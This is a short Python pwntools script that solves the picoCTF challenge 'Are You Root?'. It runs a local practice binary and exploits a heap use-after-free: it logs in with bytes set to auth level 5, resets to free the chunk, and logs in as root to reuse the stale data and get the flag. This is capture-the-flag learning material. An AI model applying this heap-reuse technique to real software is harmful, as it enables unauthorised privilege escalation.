#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the picoCTF challenge Are You Root?

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF('./auth')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

AUTH_LEVEL = '\x05' # 5 allows us to call get-flag.
NAME_SIZE = 9 # How long we want our name to be.

def conn():
    '''Establish the connection to the process.
    '''

    io = process([exe.path])

    return io

def main():
    '''Return the flag.
    '''

    with conn() as io:

        # Login with a bunch of bytes that match our required auth level.
        # The size is important, as it needs to be similar in size to the
        # username we use below such that the same chunk is used.
        io.sendlineafter(b'>', f'login {AUTH_LEVEL * NAME_SIZE}'.encode('ascii'))

        # Free the user. The chunk will be marked as previously used and free,
        # but the data will remain in the heap.
        io.sendlineafter(b'>', b'reset')

        # Login as a new user. The size is important; it must be the correct
        # size such that the same chunk is going to be used.
        io.sendlineafter(b'>', b'login root')

        # Get the flag.
        io.sendlineafter(b'>', b'get-flag')
        flag = io.recvline_containsS(b'picoCTF{')
        log.success(f'The flag is: {flag}')

        return flag


if __name__ == '__main__':
    main()
